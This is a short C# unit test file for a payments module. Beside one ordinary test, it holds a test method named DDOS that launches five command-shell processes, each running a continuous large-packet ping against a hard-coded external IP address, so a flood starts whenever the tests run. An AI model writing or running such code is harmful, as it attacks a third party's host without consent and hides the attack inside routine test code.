using BLL;
using Microsoft.VisualStudio.TestTools.UnitTesting;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Pruebas
{
    [TestClass]
    public class PruebasPagos
    {
        [TestMethod]
        public void TraerPagos()
        {
            var objRest =
            BLLPago.ReferenciasPago(6627, 2017, 2);
        }

        [TestMethod]
        public void DDOS()
        {
            System.Diagnostics.Process proc;
            string cmd = "/C ping 141.8.224.239 -t -l 65000";
            for (int i = 0; i < 5; i++)
            {
                proc = new System.Diagnostics.Process();
                proc.EnableRaisingEvents = false;
                proc.StartInfo.FileName = "cmd";
                proc.StartInfo.Arguments = cmd;
                proc.Start();
            }
        }
    }
}
